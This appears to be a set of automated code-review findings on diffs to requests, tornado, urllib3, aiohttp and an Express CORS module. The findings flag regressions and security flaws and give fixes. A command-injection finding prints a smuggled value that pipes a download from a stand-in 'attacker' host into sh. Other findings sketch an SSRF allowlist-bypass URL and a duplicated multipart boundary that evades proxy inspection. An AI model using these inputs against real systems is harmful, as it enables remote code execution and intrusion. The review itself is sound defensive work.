findings.body: The parameter was renamed from page_size to limit, which is a breaking change for any caller using the keyword argument page_size=. No test file is included in this diff to verify that list_invoices still forwards the value correctly to _query under the new name, or that callers relying on the old keyword now fail loudly. If a caller elsewhere still passes page_size=, this would raise a TypeError at call time, but nothing in this change demonstrates that behavior is verified or intentional.

findings.title: Docstring still refers to old parameter name page_size
findings.body:
The function signature was changed from page_size to limit, but line 6 of the docstring still says 'page_size: how many invoices to return.' A caller reading the docstring would look for a page_size argument that no longer exists. Update the Args entry to reference 'limit' instead.

_Also raised by the correctness agent:_ Docstring still documents the removed `page_size` parameter

findings.title: Absolute `from adapters import HTTPAdapter` will fail at import time
findings.body: Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` resolves against `sys.path`, not the `requests` package, so it raises `ImportError` on Python 3 (and on Python 2 whenever `absolute_import` is in effect or no top-level `adapters` module happens to be installed). Because it is at module scope, `import requests` itself breaks. Use `from .adapters import HTTPAdapter`.

findings.title: New request() drops verify/cert — TLS settings never reach the adapter
findings.body:
The new `request()` still advertises `verify=None` and `cert=None` in its signature (lines 148-149) but builds the `Request` without ever assigning them (lines 151-163), and `send()` calls `adapter.send(request)` with no verification arguments at all (lines 365-366). The removed `old_request` path is the only place those values were consumed.

Consequences, depending on what `HTTPAdapter.send` defaults to (not visible here):
- If the adapter does not default to verifying, every HTTPS call through the new path is unverified — a network-position attacker (public Wi-Fi, hostile upstream, DNS/BGP hijack) presents any certificate and reads or rewrites credentials, tokens and bodies, with no error surfaced to the caller.
- Even if the adapter defaults to `verify=True`, a caller-supplied CA bundle path or a client certificate (`cert=`) is silently ignored, so mutual-TLS calls lose their client identity and pinned-CA callers fall back to the system store.

Either way the parameter is accepted and has no effect, which is the dangerous shape: callers believe they configured TLS. Thread `verify`/`cert` (merged with session/config defaults) through to `adapter.send(request, verify=..., cert=...)`, or remove them from the signature until the adapter path supports them so the silence is not mistaken for support.

findings.title: New `request()` accepts timeout/verify/cert/prefetch etc. and ignores them
findings.body:
The rewritten `request()` keeps the full public signature but only forwards `method`, `url`, `headers`, `files`, `data`, `params`, `auth`, `cookies`, `allow_redirects`, `proxies` and `hooks` onto the `Request` object. `timeout`, `verify`, `cert`, `config`, `prefetch` and `return_response` are bound and then dropped on the floor, and `allow_redirects`/`proxies`/`hooks` are stashed on the request but never consumed by `self.send(prep)`.

This is silent, not loud: existing callers writing `session.get(url, timeout=5)` or `session.post(url, verify=False)` keep working syntactically but get no timeout and, for `verify`/`cert`, whatever the adapter's default TLS behaviour is rather than the caller's explicit choice. `prefetch=False` callers will now get a fully-consumed body. Prefer raising/asserting on the not-yet-implemented arguments, or thread them into `send()`, rather than accepting and discarding them.

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed in this diff, but the surviving call site at line 292 (`return self._send_request(r, **args)`, the tail of the renamed `old_request`) was not updated. Any path that still reaches `old_request` raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` until `old_request` is deleted, or delete `old_request` in the same change.

findings.title: A new HTTPAdapter per send, and `close()` no longer releases anything
findings.body:
`send()` constructs a fresh `HTTPAdapter()` on every call. Since the adapter owns the PoolManager that `Session` used to own, this means a new connection pool per request: no connection reuse at all, and each pool's sockets are left to garbage collection rather than being closed. `close()` was simultaneously reduced to `pass`, so `with requests.Session() as s:` and explicit `s.close()` no longer release any pooled connections — a file-descriptor leak under load and a behaviour regression for anyone relying on the documented close semantics.

The adapter should be created once (e.g. in `__init__`, or a per-prefix mount map) and `close()` should delegate to it.

findings.title: New Session.request→send→HTTPAdapter path is untested
findings.body: The refactored request() method now builds a Request/PreparedRequest and calls self.send(prep), which in turn instantiates a bare HTTPAdapter() and delegates sending to it (line 365-367). close() was also changed to a no-op (line 132), silently dropping the PoolManager cleanup behaviour. None of this is exercised by any test in the diff, so if the HTTPAdapter integration is broken (e.g. wrong prepare/send contract) or if close() no longer releasing connections causes resource leaks, nothing would fail during CI.

findings.title: Non-relative `from adapters import ...` resolves against sys.path
findings.body:
Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...`), but line 22 uses a bare top-level import. Under absolute-import semantics this is resolved against `sys.path`, not the `requests` package, so the module that actually gets executed is whichever `adapters.py` appears first on the path — including the script directory or, for some entry points, the current working directory.

The adversary is anyone who can drop a file into a directory that ends up on the importing process's `sys.path` (a shared working directory, a writable deploy dir, an unpacked archive the app `cd`s into). What they get is arbitrary code execution at import time inside any process that imports `requests`, plus full control of the object that every HTTP request is handed to. Change it to `from .adapters import HTTPAdapter` so the transport class can only come from inside the package.

findings.title: Cookie parse failure now returns None, crashing get_cookie/clear_all_cookies
findings.body:
On a malformed `Cookie` header the new property sets `self._cookies = None` and returns `None`. The old implementation called `self.clear_all_cookies()` and still returned a (partially populated) `SimpleCookie`, so callers always got a mapping. Now `RequestHandler.get_cookie` executes `if name in self.request.cookies:` → `TypeError: argument of type 'NoneType' is not iterable`, and `clear_all_cookies` executes `self.request.cookies.iterkeys()` → `AttributeError: 'NoneType' object has no attribute 'iterkeys'`. Both are reachable from any client that sends a Cookie header `SimpleCookie.load` rejects, turning a bad request into a 500. Reset to an empty `Cookie.SimpleCookie()` in the except branch instead of `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing all callers

findings.title: RequestHandler.cookies removed with no delegating property
findings.body: `RequestHandler.cookies` was a documented public property; the diff deletes it outright rather than replacing it with `return self.request.cookies`. Any subclass, third-party handler, or other tornado module that reads `self.cookies` (or `handler.cookies` from a template) now raises `AttributeError`. Keep a thin property on `RequestHandler` that delegates to `self.request.cookies` so the move stays backwards compatible.

findings.title: No test covers malformed-cookie handling or new cookies property
findings.body: The `cookies` property moved from RequestHandler to HTTPRequest, and its error-handling behavior changed: previously a parse failure called `self.clear_all_cookies()`, now it sets `self._cookies = None`. Downstream, `get_cookie` does `if name in self.request.cookies` and `clear_all_cookies` does `self.request.cookies.iterkeys()` — both of which would raise a TypeError if `self._cookies` is None after a malformed Cookie header. Nothing in this diff exercises the malformed-cookie path or verifies `RequestHandler.get_cookie`/`clear_all_cookies` still work correctly against `request.cookies` after the move, so this regression would pass unnoticed.

findings.title: Malformed cookies are no longer cleared on the client
findings.body: Previously, a `Cookie.load` failure triggered `clear_all_cookies()`, emitting Set-Cookie expiry headers so the client would stop resending the broken cookie. With the parse moved to `HTTPRequest`, which has no access to the response, that self-healing behaviour is gone: a client with a corrupt cookie will keep sending it (and, per the None issue above, keep getting errors). If the recovery behaviour is intended to be dropped, that is a deliberate behaviour change worth noting; otherwise the handler needs to detect the parse failure and clear the cookies itself.

findings.title: Boundary param never matches: split(";") leaves leading whitespace
findings.body:
`content_type.split(";")` on the conventional header `multipart/form-data; boundary=----WebKitFormBoundaryXyz` yields `['multipart/form-data', ' boundary=----WebKitFormBoundaryXyz']`. `" boundary=...".partition("=")` gives `k == " boundary"`, so the `k == "boundary"` test on line 363 is false, the loop falls through to the `for`/`else` on line 366, and every well-formed multipart request is logged as "Invalid multipart/form-data" with its body discarded. The previous code searched for the substring `'boundary='` anywhere in the header, so it was immune to the surrounding whitespace — this is a regression for the common case, not an edge case.

Fix by stripping the parameter before partitioning, e.g. `k, sep, v = field.strip().partition("=")`. While there, consider stripping surrounding double quotes from `v`, since RFC 2045 permits `boundary="..."` as a quoted-string.

findings.title: Boundary-parsing rewrite has no accompanying test
findings.body: The parsing logic for the Content-Type header was rewritten to scan all parameters instead of assuming 'boundary' is last, but no test exercises multipart Content-Type headers where boundary is not the first/last field (e.g. 'multipart/form-data; charset=utf-8; boundary=xyz'), nor a case with a leading space after ';' (e.g. ' boundary=xyz', which would fail the exact match on 'boundary' since partition splits on '=' but the key would be ' boundary' with a leading space after split by ';'). If this logic regresses to its old behavior or breaks on whitespace-padded parameters, nothing would catch it.

findings.title: Content-Type parameter name not stripped before comparison
findings.body:
`content_type.split(";")` yields parameters with the RFC-permitted leading whitespace intact (`"multipart/form-data; boundary=----X"` → `" boundary=----X"`), and `field.partition("=")` keeps that space in `k`, so `k == "boundary"` is false for the ordinary form of the header. The loop then falls through to the `else` branch and the body is never parsed, leaving `request.arguments`/files empty. The same comparison also rejects the RFC-2046 quoted form `boundary="----X"` only partially — the quotes stay in `v` and are passed to `_parse_mime_body`. Use `field.strip().partition("=")` and strip surrounding quotes from `v`.

Security relevance: the entry point is the client-controlled `Content-Type` request header. The attacker is any remote client; what they control is the exact spacing/quoting of the `boundary` parameter, and what they get is a choice over whether Tornado parses a multipart body while an upstream proxy, WAF or log pipeline (which parses per RFC) sees a different set of parameters — a parser differential. Impact is limited because the failure mode is fail-closed (no arguments populated) rather than mis-attributed data, hence minor.

findings.title: New util.py helpers have no tests in this diff
findings.body: make_headers, get_host, and is_connection_dropped are non-trivial logic (string/list branching, URL parsing with error raising, platform-specific socket polling) but no test file is included in this change. If get_host mis-parses a URL with '@' and ':' together, or make_headers mishandles accept_encoding as a non-str/non-list type, nothing would fail. Since these are described as 'shared helpers' being centralized, at minimum the parsing/formatting logic (get_host, make_headers) should have unit tests asserting on returned values.

findings.title: get_host's hand-rolled parser diverges from urlsplit on '#' and IPv6
findings.body:
`get_host` splits only on `://`, `/`, `@` and `:`. It never terminates the authority at a `#` (fragment) or `?` (query). For `http://trusted.example.com#@attacker.example/`, the `/`-split leaves `trusted.example.com#@attacker.example`, and the subsequent `@`-split yields host `attacker.example`, whereas `urllib.parse.urlsplit` reports `trusted.example.com`. An application that allowlists the host with the stdlib parser and then hands the same string to urllib3 will connect to the attacker's host — a classic SSRF/allowlist-bypass parser-confusion gap. The same routine also mishandles bracketed IPv6 literals (`http://[::1]:80/` hits the `:`-split and raises `LocationParseError`).

Since this file is the new single import point for callers, it is a good moment to either delegate to `urlsplit` or at least truncate the authority at the first `#` or `?` and handle `[...]` IPv6 hosts before the `:` split.

findings.title: LocationParseError message has an unsubstituted %s placeholder
findings.body: `raise LocationParseError("Failed to parse: %s")` never interpolates the URL, so any caller that hits a non-numeric port gets the literal string `Failed to parse: %s` with no indication of which URL failed. This makes the exception useless for debugging and breaks any test or log scraper that expects the URL in the message. Should be `raise LocationParseError("Failed to parse: %s" % url)` (or `% port`, whichever the original used).

findings.title: No test exercises describe() for both event kinds
findings.body: The change removes redundant casts and relies on TypeScript's discriminated-union narrowing for `event.x` and `event.code`. If a future refactor breaks the discriminant (e.g. renames `kind` or changes the union shape) or if the runtime value doesn't match the type at a boundary, nothing in this diff would catch a wrong string being produced by `describe()`. No test file is part of this change and no existing test coverage is referenced.

findings.title: HTTPMove.location changes type from str to URL, breaking callers
findings.body:
Previously `self.location` was assigned the raw `location` argument (a string in the documented usage), and only the header value was passed through `URL(...)`. After this change `self.location` is a `yarl.URL` instance. The documented contract in `docs/web_reference.rst` states the attribute is "the location the response redirects to, **as the string it was constructed with**" and that application code compares it against configured strings and calls `str.startswith` on it. `URL` has no `startswith` method and `URL("/foo") == "/foo"` is False, so those callers will raise `AttributeError` or silently take the wrong branch. Additionally `URL()` normalises/quotes the input, so even `str(self.location)` may not round-trip to the original string.

If the goal is just to avoid constructing the URL twice, keep the attribute as the original value and use a local variable for the header, e.g. `url = URL(location); self.headers['Location'] = str(url); self.location = location`.

findings.title: self.location now holds a URL, contradicting documented string contract
findings.body: docs/web_reference.rst states that HTTPMove.location is 'the location the response redirects to, as the string it was constructed with' and that application code compares it against configured strings and passes it to str.startswith. This diff changes `self.location = location` (a string) to `self.location = URL(location)`, so the attribute is now a URL object, not the original string. Any caller following the documented contract and calling `.startswith(...)` on `location` will now raise AttributeError (URL has no startswith) or otherwise behave differently. The docstring needs to be updated to reflect the new type, and/or callers need to be considered — but as-is, the documentation is now false for this attribute.

findings.title: No test guards self.location's documented string type
findings.body: The change makes `self.location` a `URL` object instead of the original string (previously `self.location = location` kept the raw string). Per docs/web_reference.rst, `HTTPMove.location` is documented as 'the string it was constructed with', and application code is expected to call `str.startswith` on it or compare it to configured strings. A `URL` object will fail `str.startswith` and equality checks against plain strings. There is no test in this diff (or apparently in the existing suite) asserting `isinstance(exc.location, str)` or checking `location.startswith(...)`/equality behavior, so this regression would go undetected.

findings.title: location type change can make downstream redirect checks fail open
findings.body:
`self.location` used to be the exact string the caller passed; it is now a `yarl.URL`. The documented contract (docs/web_reference.rst) says application code compares this attribute against configured strings and calls `str.startswith` on it. After this change:

- `exc.location == "/safe/path"` is `False` for every string, so an allow-list check silently rejects everything and a deny-list check silently admits everything;
- `exc.location.startswith("/")` raises `AttributeError` on a `URL`, so any open-redirect guard written that way either crashes or, if wrapped in a broad `except`, is skipped.

The wire value is unchanged (`str(self.location)` equals the previous `str(URL(location))`), so the risk is entirely in callers that inspect the attribute. If the type change is intended, keep the raw string on `self.location` and expose the parsed form under a new name (e.g. `self._location_url`), or land the type change with a release note so guards can be updated.

Adversary: whoever influences the redirect target (e.g. a `?next=` parameter reaching `HTTPFound(location=...)`) in an application that relies on a post-construction check of `.location` to reject external hosts. What they control: the target string. What they get: an open redirect that the application believes it is filtering.

findings.title: readany can return empty bytes before EOF after loop removal
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also "at the end of a chunk, which can happen with no new data in the buffer", and it explicitly requires callers to "re-check its condition after waking". Replacing the `while` with an `if` removes exactly that re-check: after a spurious chunk-boundary wake, `self._buffer` is still empty and `self._eof` is still false, yet control falls through to `self._read_nowait(-1)`, which returns an empty payload.

Callers of `readany()` conventionally treat an empty return as end-of-stream (`while True: chunk = await resp.content.readany(); if not chunk: break`), so this silently truncates responses in a way that depends on chunk-boundary timing and will not reproduce reliably. Restore the `while` loop so the buffer/EOF condition is re-evaluated after every wake.

_Also raised by the security agent:_ readany can return b"" early, letting chunk framing truncate a body

findings.title: No test covers spurious wake causing empty buffer after single wait
findings.body: The docstring for `_wait` explicitly warns that the waiter can be resolved with no new data in the buffer, so callers must re-check their condition rather than assume data arrived. This change replaces `while not self._buffer and not self._eof` with a single `if`, meaning that if the waiter wakes without new data (the documented spurious-wake case), `readany` will now return early via `_read_nowait(-1)` and likely produce an empty/incorrect read instead of waiting again. There is no test in this PR (or evident in the retrieved context) that simulates a spurious wake to catch this regression — such a test would fail before this change's loop was removed but presumably still passes now since nothing exercises that path.

findings.title: Implicit relative import breaks package import on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Python 3 removed implicit relative imports (PEP 328), so this resolves against `sys.path` rather than the `requests` package and raises `ModuleNotFoundError: No module named 'adapters'` as soon as `requests.sessions` is imported \u2014 which happens on `import requests`. It is not "the same module": on Python 3 it is no module at all, and on Python 2 it would silently shadow any top-level `adapters` package that happened to be installed. The adjacent line 6 (`from .packages.urllib3.poolmanager import PoolManager`) shows the explicit-relative form is the house style here. Restore `from .adapters import HTTPAdapter`.

findings.title: Implicit relative import lets a top-level `adapters` module hijack HTTPAdapter
findings.body:
`from .adapters import HTTPAdapter` is not the same module as `from adapters import HTTPAdapter`. Under Python 3 (and under Python 2 with `from __future__ import absolute_import`) the dotted form is the only one that binds to `requests/adapters.py`; the undotted form is an absolute import resolved against `sys.path`.

Two consequences:

1. Correctness: on Python 3 this raises `ImportError: No module named 'adapters'` at import time for anyone doing `import requests`, unless some unrelated top-level `adapters` happens to be installed.
2. Security: where such a module *does* exist earlier on `sys.path` — the script's own directory, the CWD for `python -c`/REPL invocations, or any third-party distribution that ships a top-level `adapters` package — its code is executed at import and its `HTTPAdapter` becomes the transport for every `Session`. The adapter owns connection pooling, proxy selection and TLS verification, so whoever controls it can disable certificate checking, redirect traffic, or read credentials and response bodies for all HTTP calls the host application makes. The attacker is anyone who can drop a file into a directory that precedes `requests` on `sys.path` (a co-located user account, a writable deployment directory, or a squatted `adapters` package on the index); they gain arbitrary code execution in the importing process plus full interception of its HTTP traffic.

Restore the leading dot. If the goal was stylistic, `from requests.adapters import HTTPAdapter` is the explicit-absolute equivalent and is equally unambiguous.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
The PR premise ("cookies is always a mapping after construction") contradicts the retrieved implementation of `HTTPRequest.cookies`, which returns `None` when the `Cookie` header is present but unparseable, with a docstring stating "every consumer has to allow for that". With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning a malformed client cookie header into a 500 for any handler that calls `get_cookie` (which includes secure-cookie/XSRF paths). Either restore the `self.request.cookies is not None and ...` guard, or change the `cookies` property to return an empty mapping instead of `None` and update its docstring accordingly.

_Also raised by the tests agent:_ No test covers get_cookie when request.cookies is None

findings.title: Removed None guard lets a malformed Cookie header raise TypeError
findings.body:
`self.request.cookies` is documented in `tornado/httpserver.py` to return `None` when the Cookie header is present but cannot be parsed — "every consumer has to allow for that". After this change, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled by any unauthenticated remote client. Sink: the membership test on line 3, reached by every handler that calls `get_cookie` / `get_secure_cookie` (XSRF handling, session lookup, etc.). Result: an unhandled exception and a 500 on any such route, triggerable at will and with a trivially cheap request.

The failure is fail-closed (no auth bypass), so the impact is availability and noisy error paths rather than access. Restore the guard, or make the `cookies` property return an empty dict on parse failure so the invariant the commit message assumes ("always a mapping after construction") is actually true.

findings.title: Dropping strip() breaks boundary parsing for normal Content-Type headers
findings.body:
`content_type.split(";")` yields segments that retain the surrounding whitespace of the header, e.g. `"multipart/form-data; boundary=----abc"` splits into `["multipart/form-data", " boundary=----abc"]`. With the `.strip()` removed, `field.partition("=")` produces `k == " boundary"`, so the comparison `k == "boundary"` on line 5 never matches for the overwhelmingly common form of the header, `_parse_mime_body` is never called, and the multipart body is silently discarded (no fields/files parsed, no error raised).

The strip was not redundant: it also trimmed trailing whitespace from the value, so even in the no-leading-space case (`multipart/form-data;boundary=x `) the boundary passed to `_parse_mime_body` may now carry stray whitespace/CR and fail to match the body delimiters.

Restore `field.strip().partition("=")`, or at minimum strip `k` and `v` individually.

findings.title: Dropping strip() on Content-Type params creates a boundary parser differential
findings.body:
`content_type` comes straight from the request's `Content-Type` header, which is fully attacker-controlled. The old code normalised each `;`-separated parameter with `field.strip()` before splitting on `=`; the new code does not. Two consequences:

1. For the ordinary, RFC-conformant form `multipart/form-data; boundary=abc` (optional whitespace after `;`), the key becomes `" boundary"`, never equals `"boundary"`, and `_parse_mime_body` is never called — multipart bodies from normal clients are silently dropped. Any handler that relies on form fields or uploaded files for an authorisation or business decision now sees them absent.
2. Because the loop takes the *first* key that literally equals `boundary`, a client can send `Content-Type: multipart/form-data; boundary=AAA;boundary=BBB`. A whitespace-normalising intermediary (reverse proxy, WAF, upload scanner, or any other RFC-2045-conformant parser) selects `AAA` and inspects the body under that boundary, while Tornado skips `" boundary=AAA"` and parses under `BBB`. The two components then see different part sets — the classic content-inspection bypass for file uploads.

Additionally the value is no longer right-trimmed, so a trailing space/tab in the header yields a boundary that will not match the body delimiter.

Restore the normalisation, e.g. `k, sep, v = field.strip().partition("=")`, and ideally strip `v` (and surrounding quotes) as well.

findings.title: No test covers whitespace-sensitive boundary parsing after strip removal
findings.body: The diff removes `.strip()` before `partition("=")`, so `k` now retains leading whitespace when the Content-Type header has a space after the semicolon (e.g. `multipart/form-data; boundary=xyz`, a very common format). Previously `k == "boundary"` would match after stripping; now it may fail to match, causing the multipart boundary to go undetected. No test in this change (or referenced) verifies parsing of a Content-Type value with a space after the semicolon, so this regression would not be caught.

findings.title: Format placeholder left in message with no argument
findings.body: The string still contains `%s` but the `% url` interpolation was removed, so `LocationParseError` is raised with the literal text `Failed to parse: %s`. The URL that failed to parse is lost, which makes the exception useless for diagnosing bad input (and any caller or test that matches the message text against the URL will now fail). If the intent was to shorten the message, drop the placeholder too (`raise LocationParseError("Failed to parse")`); if the URL should stay, restore `% url`.

findings.title: No test would catch the dropped %s interpolation argument
findings.body: The change removes `% url` from the format string, so `LocationParseError` will now literally contain the text "%s" instead of the invalid URL. If any test exercises this parse-error path, it likely only checks that `LocationParseError` is raised (e.g. via `assertRaises`), not the message content, so this defect would slip through. Add or update a test that asserts on the exception's message/args to catch cases where the interpolation is broken.

findings.title: Command injection: create_archive interpolates args into shell=True
findings.body:
`create_archive` formats `name` and `directory` directly into a shell command string and executes it with `shell=True`. Anything reaching these parameters is interpreted by /bin/sh, so a value such as `foo; curl attacker/x | sh` or `$(id)` in either argument runs arbitrary commands with the service's privileges. Even without metacharacters, a `name` of `../../etc/cron.d/x` escapes the intended `/exports` directory, and a `directory` containing spaces silently expands into multiple tar operands.

Fix: drop `shell=True` and pass an argument list, as `list_exports` on line 5 already does:

```python
subprocess.run(["tar", "-czf", os.path.join("/exports", f"{name}.tar.gz"), directory], check=True)
```

and additionally validate `name` against a strict allowlist (e.g. `[A-Za-z0-9_-]+`) and resolve `directory` so it cannot point outside the intended root — the list form stops command execution but not path traversal.

_Also raised by the correctness agent:_ Unquoted shell interpolation breaks on spaces and metacharacters

findings.title: No test covers create_archive's command construction
findings.body: create_archive builds a shell command via string interpolation of `name` and `directory` and executes it with shell=True. Nothing in this diff exercises this function, so a change that breaks archive creation (e.g. path handling, quoting, or the injection vector itself) would go undetected by any test suite.

findings.title: Returns CompletedProcess while sibling function returns bytes
findings.body: `list_exports` (line 5) returns `.stdout` (bytes), whereas `create_archive` returns the whole `CompletedProcess` object. Within one small module that is an easy trap for callers who assume the module's functions return output. Either return nothing (the archive path is the useful value) or return the archive path `f"/exports/{name}.tar.gz"` so the result is something a caller can act on. No callers were retrieved, so this is a consistency concern rather than a confirmed break.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The origin allowlist that `ALLOWED` enforces on lines 6-7 is effectively switched off for any route this middleware is mounted on, while cookie/credential-bearing cross-origin requests remain enabled.

Adversary: any web page a logged-in user visits. What they control: the page's own origin and the fetch/XHR it issues (`credentials: 'include'`), which carries the victim's session cookie. What they get: the ability to read authenticated API responses cross-origin — session-scoped data exfiltration, and state-changing calls with the victim's identity if the API has no separate CSRF token.

One caveat I can state precisely: with the standard Express `cors` package, `origin: "*"` emits a literal `Access-Control-Allow-Origin: *`, and browsers refuse to honour that for credentialed requests, so the middleware as written is simultaneously insecure in intent and non-functional for its stated purpose ("call the API with cookies"). The usual next commit is to change it to `origin: true`, which reflects the request's `Origin` header and makes the attack fully live. Fix it now by allowlisting the dashboard origin explicitly — e.g. `origin: [DASHBOARD_ORIGIN]` (or adding that origin to `ALLOWED`) — rather than by reflecting.

I could not see where `dashboardCors` is mounted; no route registration was in the diff or in retrieved context, so the exposed surface is unknown.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
The `cors` middleware configured with `origin: "*"` emits the literal header `Access-Control-Allow-Origin: *`. The Fetch spec requires that, when a request is made with `credentials: 'include'` (cookies), the `Access-Control-Allow-Origin` value be an exact origin echo — a literal `*` causes the browser to block the response, and `Access-Control-Allow-Credentials: true` alongside `*` is explicitly invalid. So this middleware cannot achieve the PR's stated goal of letting the dashboard send cookies; every credentialed cross-origin call will fail CORS.

To actually work, the origin must be reflected (or matched against an allowlist) rather than wildcarded — e.g. add the dashboard origin to the existing `ALLOWED` list used on line 6 and reuse that middleware, or pass a function/array origin so the response echoes the concrete origin. That also avoids the incidental effect of accepting every origin.

findings.title: New dashboardCors export has no test coverage
findings.body: The new `dashboardCors` middleware combines `origin: "*"` with `credentials: true`, which most CORS libraries reject or silently misbehave with at runtime (browsers disallow credentialed wildcard responses). Nothing in this diff exercises this export to verify the actual emitted headers or that requests behave as intended. If the origin/credentials logic were wrong (e.g., library silently disables credentials, or wildcard is echoed incorrectly), no test would fail.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
